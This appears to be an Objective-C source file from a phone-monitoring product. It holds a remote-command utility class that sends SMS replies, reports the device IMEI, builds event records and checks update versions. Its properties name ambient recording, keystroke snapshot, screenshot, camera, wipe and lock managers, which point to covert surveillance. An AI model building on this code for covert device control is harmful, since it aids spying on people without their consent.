/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  RemoteCmdUtils
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  18/11/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "RemoteCmdUtils.h"
#import "FxSystemEvent.h"
#import "SMSSendMessage.h"
#import "RemoteCmdErrorMessage.h"
#import "RemoteCmdData.h"
#import "ProductInfoImp.h"
#import "AppContext.h"
#import "DateTimeFormat.h"
#import "DefStd.h"
#import "SMSCmd.h"
#import "PCC.h"
#import "PushCmd.h"

#import "RemoteCmdExceptionCode.h"

@implementation RemoteCmdUtils

@synthesize mSMSSender;
@synthesize mEventDelegate;
@synthesize mAppContext;
@synthesize mServerAddressManager;
@synthesize mPreferenceManager;
@synthesize mActivationManagerProtocol;
@synthesize mDataDelivery;
@synthesize mEventDelivery;
@synthesize mSystemUtils;
@synthesize mEventRepository;
@synthesize mConnectionHistoryManager;
@synthesize mConfigurationManager;
@synthesize mAddressbookManager;
@synthesize mLicenseManager;
@synthesize mMediaSearchPath;
@synthesize mSoftwareUpdateManager;
@synthesize mUpdateConfigurationManager;
@synthesize mIMVersionControlManager;

@synthesize mSyncTimeManager;
@synthesize mSyncCDManager;
@synthesize mWipeDataManager;
@synthesize mDeviceLockManager;
@synthesize mApplicationProfileManager;
@synthesize mUrlProfileManager;
@synthesize mBookmarkManager;
@synthesize mApplicationManager;
@synthesize mAmbientRecordingManager;
@synthesize mCalendarManager;
@synthesize mNoteManager;
@synthesize mCameraEventCapture;
@synthesize mKeySnapShotRuleManager;
@synthesize mDeviceSettingsManager;
@synthesize mHistoricalEventManager;
@synthesize mScreenshotCaptureManager;
@synthesize mTemporalControlManager;
@synthesize mNetworkTrafficAlertManager;

static RemoteCmdUtils *mRemoteCmdUtils = nil;

+ (RemoteCmdUtils *) sharedRemoteCmdUtils {
   DLog (@"sharedRemoteCmdUtils------->")
   @synchronized (self) {
       if (mRemoteCmdUtils == nil) {
            mRemoteCmdUtils =[[self alloc] init];
	   }
    }
    return mRemoteCmdUtils;
}

/**
 - Method name:createSystemEvent:andReplyMessage
 - Purpose:This method is used to create system event
 - Argument list and description: aReplyMessage (NSString), andSenderNumber(NSString)
 - Return type and description:No Return
*/

- (void) createSystemEvent:(id ) aEvent 
		   andReplyMessage: (NSString *) aReplyMessage {
	
	int remoteCommandType;
	if ([aEvent isKindOfClass:[RemoteCmdData class]]) {
		RemoteCmdData *event=(RemoteCmdData *)aEvent;
		remoteCommandType=[event mRemoteCmdType];
	}
	else if ([aEvent isKindOfClass:[SMSCmd class]]) {
		remoteCommandType=kRemoteCmdTypeSMS;
	}
	else if ([aEvent isKindOfClass:[PCC class]]){
	   remoteCommandType=kRemoteCmdTypePCC;	
    } else {
        remoteCommandType=kRemoteCmdTypePUSH;
    }

	DLog (@"createSystemEvent in RemoteCommand Utils");
	FxSystemEvent *systemEvent=[[FxSystemEvent alloc] init];
	[systemEvent setMessage:aReplyMessage];
	[systemEvent setDirection:kEventDirectionOut];
	[systemEvent setDateTime:[DateTimeFormat phoenixDateTime]];
	switch (remoteCommandType) {
		case kRemoteCmdTypeSMS:
			[systemEvent setSystemEventType:kSystemEventTypeSmsCmdReply];
		break;
		case kRemoteCmdTypePCC:
			[systemEvent setSystemEventType:kSystemEventTypeNextCmdReply];
		break;
        case kRemoteCmdTypePUSH:
            [systemEvent setSystemEventType:kSystemEventTypePushCmdReply];
            break;
        default:
            break;
	}
	if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
	      [mEventDelegate performSelector:@selector(eventFinished:) withObject:systemEvent];
	}
	[systemEvent release];
 }

/**
 - Method name:sendSMSWithRecipientNumber:withRemoteCmdData:andErrorCode:
 - Purpose:This method is used to send reply message 
 - Argument list and description: aRecipientNumber (NSString), aRemoteCmdData(RemoteCmdData),aErrorCode (NSUInteger)
 - Return type and description:No Return
*/

- (void) sendSMSWithRecipientNumber:(NSString *) aRecipientNumber
						 andMessage: (NSString *)aMessage {
#if TARGET_OS_IPHONE
	DLog (@"Sending SMS....%@",aRecipientNumber);
	if ([aRecipientNumber length]) {
		SMSSendMessage *message = [[SMSSendMessage alloc] init];
	    [message setMMessage:aMessage];
	    [message setMRecipientNumber:aRecipientNumber];
	    if ([mSMSSender respondsToSelector:@selector(sendSMS:)]) {
		   [mSMSSender performSelector:@selector(sendSMS:) withObject:message];
		   DLog (@"Sent SMS Reply:%@ to: %@",aMessage,aRecipientNumber);
		}
		[message release];
	}
	else {
		DLog (@"Unable to send sms")
	}
#endif
}

  
- (NSString *) replyMessageFormatWithCommandCode:(NSString *) aCmdCode 
									andErrorCode:(NSUInteger) aErrorCode {
	if (![aCmdCode length]) aCmdCode=NSLocalizedString(@"kInvalid", @"");
	NSString *messageString=[NSString stringWithFormat:@"%@[%@]",[self getProductIdAndVersion], aCmdCode];
    if (aErrorCode==_SUCCESS_) {
		  messageString=[NSString stringWithFormat:@"%@ %@\n",messageString,NSLocalizedString(@"kOK", @"")];
	}
	else {
		if (aErrorCode == _ERROR_ || // Get empty string
			[[RemoteCmdErrorMessage errorMessage:aErrorCode] length]>0)
            //To check IMEI for error -307
            if (aErrorCode == kCmdExceptionErrorProductNotActivated) {
                NSString * IMEI = [NSString stringWithFormat:@"%@",[[mAppContext getPhoneInfo]getIMEI]];
                DLog (@"Product is not activated (IMEI: %@)", IMEI)
                messageString=[NSString stringWithFormat:@"%@ %@\n%@ [IMEI:%@]",messageString,NSLocalizedString(@"kERROR", @""),[RemoteCmdErrorMessage errorMessage:aErrorCode],IMEI];
            }else{
                messageString=[NSString stringWithFormat:@"%@ %@\n%@",messageString,NSLocalizedString(@"kERROR", @""),[RemoteCmdErrorMessage errorMessage:aErrorCode]];
            }


            
		 		else
		   messageString=[NSString stringWithFormat:@"%@ %@(%d)",messageString,NSLocalizedString(@"kERROR", @""),aErrorCode];
	 }
	return messageString;
}

/**
 - Method name:getProductIdAndVersion
 - Purpose: This is method is used to get product information .
 - Argument list and description: No argument
 - Return type and description: pidAndVersion (NSString *)
*/

- (NSString *) getProductIdAndVersion {
	id <ProductInfo> info=[mAppContext getProductInfo];
	NSString *pidAndVersion=[NSString stringWithFormat:@"[%d %@]",[info getProductID],[info getProductFullVersion]];
	return pidAndVersion;
}

/**
 - Method name:			parseVersion:
 - Purpose:				This method is used to parse version [-]major.minor.build to array of at least two elements major without sign and minor. 
 Build number is optional
 - Argument list and description: Version string
 - Return description:	Array of major, minor, and build
 */
+ (NSArray *) parseVersion: (NSString *) aVersion {
	NSArray *versionComponents	= [aVersion componentsSeparatedByString:@"."];
	DLog (@"versionComponents %@", versionComponents)
	NSString *majorString		= nil;
	NSString *minorString		= nil;
	NSString *buildString		= nil;
	if ([versionComponents count] > 0)
		majorString		= [versionComponents objectAtIndex:0];	// major
	DLog (@"majorString %@", majorString)
	if ([versionComponents count] > 1)
		minorString		= [versionComponents objectAtIndex:1];	// minor	
	DLog (@"minorString %@", minorString)	
	if ([versionComponents count] > 2)
		buildString		= [versionComponents objectAtIndex:2];	// build
	DLog (@"major/minor/build %@/%@/%@", majorString, minorString, buildString)
	// major and minor are required; build is optional
	if (majorString		&&	minorString) {
		// -- get absolute value of major version
		NSNumberFormatter *numberFormat = [[[NSNumberFormatter alloc] init] autorelease];
		NSNumber *majorNumber			= [numberFormat numberFromString:majorString];
		if ([majorNumber intValue] < 0) { // Testing build
			majorNumber			= [NSNumber numberWithInt:abs([majorNumber intValue])];
		}	
		NSNumber *minorNumber	= [numberFormat numberFromString:minorString];
		
		// -- optional for build version
		NSNumber *buildNumber	=  nil;
		if (buildString)
			buildNumber			= [numberFormat numberFromString:buildString];		
		
		if (buildNumber) {
			versionComponents	= [NSArray arrayWithObjects:majorNumber, minorNumber, buildNumber, nil];		
		} else
			versionComponents	= [NSArray arrayWithObjects:majorNumber, minorNumber, nil];				
	} else {
		versionComponents		= [NSArray array];
	}
	DLog (@"version to be processed %@", versionComponents)
	return (versionComponents);
}

+ (BOOL) shouldUpdateSoftwareCurrentVersionComponent: (NSArray *) aCurrentVersionComponents 
								newVersionComponents: (NSArray *) aNewVersionComponents {
	DLog (@">> shouldUpdateSoftwareCurrentVersionComponent")
	BOOL shouldUpdate = NO;
	
	// -- new version
	NSInteger majorNewVersion		= [[aNewVersionComponents objectAtIndex:0] intValue];
	NSInteger minorNewVersion		= [[aNewVersionComponents objectAtIndex:1] intValue];	
	
	// -- current version
	NSInteger majorCurrentVersion	= [[aCurrentVersionComponents objectAtIndex:0] intValue];
	NSInteger minorCurrentVersion	= [[aCurrentVersionComponents objectAtIndex:1] intValue];	
	
	// -- check major update	
	// CASE: major of new version is newer
	if (majorNewVersion > majorCurrentVersion) {
		shouldUpdate = YES;									// Major version is newver
	}
	// CASE: major of new version is older or same
	else if (majorNewVersion == majorCurrentVersion) {	
		// compare minor number
		if (minorNewVersion > minorCurrentVersion) {
			shouldUpdate = YES;								// Minor version is newver
		} else if (minorNewVersion == minorCurrentVersion) {
			// compare build number	if server sent it
			
			// -- check build update (compare buld version only when server send build version number, otherwise ignore it)
			if ([aNewVersionComponents count] >= 3) {	
				if ([[aNewVersionComponents objectAtIndex:2] intValue] > [[aCurrentVersionComponents objectAtIndex:2] intValue])					
					shouldUpdate = YES;						// Build version is newver
			}									
		} 		
	}	
	DLog (@">> shouldUpdateSoftwareCurrentVersionComponent %d", shouldUpdate)
	return shouldUpdate;	
}


/**
 - Method name:dealloc
 - Purpose: This is memory mangement method. Invoked when the class object releasd.
 - Argument list and description: No argument
 - Return type and description: No Return
*/

- (void) dealloc { 
	[mSMSSender release];
	mSMSSender=nil;
	[mEventDelegate release];
	mEventDelegate=nil;
	[mAppContext release];
	mAppContext=nil;
	[mDataDelivery release];
	mDataDelivery=nil;
	[mEventDelivery release];
	mEventDelivery=nil;
	[mServerAddressManager release];
	mServerAddressManager=nil;
	[mPreferenceManager release];
    mPreferenceManager=nil;
	[mActivationManagerProtocol release];
	mActivationManagerProtocol = nil;
	[mSystemUtils release];
	mSystemUtils=nil;
	[mEventRepository release];
	mEventRepository=nil;
	[mConnectionHistoryManager release];
	mConnectionHistoryManager=nil;
	[mConfigurationManager release];
	mConfigurationManager=nil;
	[mAddressbookManager release];
	mAddressbookManager=nil;
	[mMediaSearchPath release];
	mMediaSearchPath=nil;
	[mLicenseManager release];
	mLicenseManager = nil;
	[super dealloc];	
}

@end
